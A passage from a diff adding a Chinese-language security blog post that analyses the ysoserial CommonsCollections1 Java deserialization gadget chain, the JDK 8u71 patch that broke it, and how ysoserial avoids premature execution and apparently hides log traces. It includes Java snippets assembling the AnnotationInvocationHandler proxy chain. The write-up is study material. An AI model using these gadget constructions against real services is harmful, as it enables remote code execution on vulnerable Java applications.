+<p>getInterfaces().length==1   =&gt; 只实现了一个接口</p>
+<p>getInterfaces()[0]==Annotation.class =&gt; 实现Annotation接口</p>
+<p>因为继承了Annotation所以后面两个自然满足，只需要找到java自带的注解类即可</p>
+<ul>
+<li>
+<p>Deprecated.class</p>
+</li>
+<li>
+<p>Override.class</p>
+</li>
+<li>
+<p>SuppressWarnings.class</p>
+</li>
+</ul>
+<h3 id="yso动态代理处理">yso动态代理处理</h3>
+<p>yso利用了Gadgets类来处理动态代理</p>
+<pre><code class="language-java">final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
+</code></pre>
+<p>原理是一样的，步入createMemoitizedProxy</p>
+<pre><code class="language-java">   public static &lt;T&gt; T createMemoitizedProxy ( final Map&lt;String, Object&gt; map, final Class&lt;T&gt; iface, final Class&lt;?&gt;... ifaces ) throws Exception {
+        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
+    }
+</code></pre>
+<p>在createMemoitizedProxy方法中又调用了createMemoizedInvocationHandler(map)</p>
+<pre><code class="language-java">public static InvocationHandler createMemoizedInvocationHandler ( final Map&lt;String, Object&gt; map ) throws Exception {
+        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
+    }
+</code></pre>
+<p>ANN_INV_HANDLER_CLASS常量</p>
+<figure data-type="image" tabindex="32"><img src="https://img-blog.csdnimg.cn/img_convert/f701a35ecc26c0b290434fba1b1a7aac.png" alt="image-20220114143503218" loading="lazy"></figure>
+<p>所以和自己构造是一样的①和②等价</p>
+<pre><code class="language-java">①final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+
+②Constructor con1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+        con1.setAccessible(true);
+        InvocationHandler ih = (InvocationHandler) con1.newInstance(Override.class, lazyMap);
+
+        //最后一步就是创建动态代理，传入InvocationHandler，反序列化时会调用memberValues的entrySet方法，会首先触发InvocationHandler的invoke方法
+        Object proxy = Proxy.newProxyInstance(ih.getClass().getClassLoader(), new Class[]{Map.class}, ih);
+        
+①final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
+
+②Constructor con2 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+        con2.setAccessible(true);
+        Object ih2 = con2.newInstance(Override.class, proxy);
+</code></pre>
+<h3 id="yso的其他操作">yso的其他操作</h3>
+<h4 id="非预期命令执行">非预期命令执行</h4>
+<p>在调试自己构造的Poc时可能会遇到弹出两次计算器或者超前弹出了计算器</p>
+<p>这是因为Idea在调试模式下会调用对象的toString方法，而我们构造了动态代理，但调用了代理对象的toString方法就会调用handler的invoke方法导致非预期的命令执行。</p>
+<p>我们可以手动关闭调试时的调用，去掉红色框内的选项</p>
+<figure data-type="image" tabindex="33"><img src="https://img-blog.csdnimg.cn/img_convert/dde42c6fb6f67485c08205e04c82cc0b.png" alt="image-20220114163427240" loading="lazy"></figure>
+<p>而在yso中，为了解决这个问题，它在开始创建transformerChain常量时并没有放入执行代码</p>
+<pre><code class="language-java">final Transformer transformerChain = new ChainedTransformer(
+	new Transformer[]{ new ConstantTransformer(1) });
+</code></pre>
+<p>在动态代理套娃完成后，才将代码赋值给iTransformers常量，然后直接返回对象去序列化，就不会有非预期的命令执行了</p>
+<h4 id="隐藏日志特征">隐藏日志特征</h4>
+<p>yso的transformers接口数组定义时，多在末尾创建了一个ConstantTransformer对象。</p>
+<p>因为在命令执行时会返回异常信息，但是存在这个ConstantTransformer对象时的异常信息是不同的</p>
+<p>少对象时</p>
+<figure data-type="image" tabindex="34"><img src="https://img-blog.csdnimg.cn/img_convert/767bc69113385c7663a0471c5466ee06.png" alt="image-20220114164447113" loading="lazy"></figure>
+<p>多对象时</p>
+<figure data-type="image" tabindex="35"><img src="https://img-blog.csdnimg.cn/img_convert/e8a9ef51f73091e76c7f6e69bfc8e263.png" alt="image-20220114164415476" loading="lazy"></figure>
+<p>所以判断可能是为了隐藏日志特征</p>
+<h2 id="版本限制">版本限制</h2>
+<p>CC1在8u71后不能使用，我们对比下新老版本，分析一下原因</p>
+<pre><code>http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d
+</code></pre>
+<h3 id="基于transformedmap">基于TransformedMap</h3>
+<p>第50-51行删除setValue的调用（这是一种黑名单的方式）</p>
+<h3 id="基于lazymap">基于LazyMap</h3>
+<p>40-41行memberValues.entrySet()变为streamVals.entrySet()</p>
+<figure data-type="image" tabindex="36"><img src="https://img-blog.csdnimg.cn/img_convert/87d08a429ca123441765602220d70ef7.png" alt="image-20220114161033478" loading="lazy"></figure>
+<p>21行streamVals 通过s.readField获得</p>
+<figure data-type="image" tabindex="37"><img src="https://img-blog.csdnimg.cn/img_convert/648b86c2639332804552683ac3180fe1.png" alt="image-20220114161039655" loading="lazy"></figure>
+<p>15行删去了s.defaultReadObject</p>
+<figure data-type="image" tabindex="38"><img src="https://img-blog.csdnimg.cn/img_convert/01f1867bc032972fb18894ea983e0da2.png" alt="image-20220114161200976" loading="lazy"></figure>
+<p><strong>这里得到的<code>streamVals</code>和通过和<code>s.defaultReadObject</code>得到的对象有什么不同呢？</strong></p>
+<p>其实和这个并没关系，只是改变后不再直接使用反序列化得到的Map对象，而是新建了一个<code>LinkedHashMap</code>对象</p>
+<p>因为最后的poc是两个<code>AnnotationInvocationHandler</code>的套娃，外面的<code>AnnotaationInvocationHandler</code>（直接readObject的）它获得的<code>streamVals</code>确实还是一个代理对象，调用<code>streamVals</code>上面的方法确实会进入到<code>invoke</code>，最后也确确实实会调用到里层的<code>AnnotationInvocationHandler.invoke()</code>的<code>this.memberValues.get()</code>。</p>
+<p>但是，后续对Map的操作都是基于这个新的<code>LinkedHashMap</code>对象，也就是里层的<code>Ann...Handler</code>的<code>memberValues</code>已经不是<code>LazyMap</code>了，而是<code>LinkedHashMap</code>了</p>
+<h2 id="漏洞原理">漏洞原理</h2>
+<p>在回过头来看漏洞原理</p>
+<p>这条链最终是利用<code>org.apache.commons.collections.functors.InvokerTransformer</code> 其中的 <code>transform()</code>方法中的反射机制来调用<code>java.lang.Runtime</code>的<code>exec()</code>进行命令执行</p>
+<p>还有一个关键点在于Java 要能完成序列化与反序列化要求这个被序列化的类有继承Serializable，而Runtime类没有继承，所以直接使用就会报错。而Runtime.class是属于java.lang.Class，java.lang.Class实现了Serializable接⼝所以可以被序列化。而<strong>ChainedTransformer</strong>中的<strong>transform</strong>方法实现了Transformer接口的类数组的遍历，依次调用其中的transform方法<strong>传递</strong>给下一个元素，成为了关键的串连线，非常巧妙。</p>
+<p>然后不管是基于TransformedMap还是LazyMap实现的Poc，都只是因为AnnotaationInvocationHandler方法重写了readObject，然后一步步走到了transform方法的执行</p>
+<h2 id="后记">后记</h2>
+<p>作为一个刚开始学java安全的新人，网络上CC链的相关分析实在是很多。但大都不是很基础，会看的一头雾水，所以不如静下心来尝试自己先找一些Demo开始一点点的分析，遇到问题要先自己思考，等到思考过后再去寻求答案才是正确的选择。最后，小白入门，如果有错误希望师傅能够及时指出。</p>
+<h2 id="参考资料">参考资料</h2>
+<p>P牛-Java安全漫谈</p>
+<p>https://last-las.github.io/2020/11/05/yso-CommonsCollections/</p>
+<p>https://www.cnblogs.com/9eek/p/15050035.html</p>
+<p>https://paper.seebug.org/1242/#commons-collections</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/yso-zhi-urldns-lian/" class="post-title gt-a-link">
+                    yso之URLDNS链
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/yso-zhi-cc1-lian/" class="leancloud_visitors" data-flag-title="yso之CC1链">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
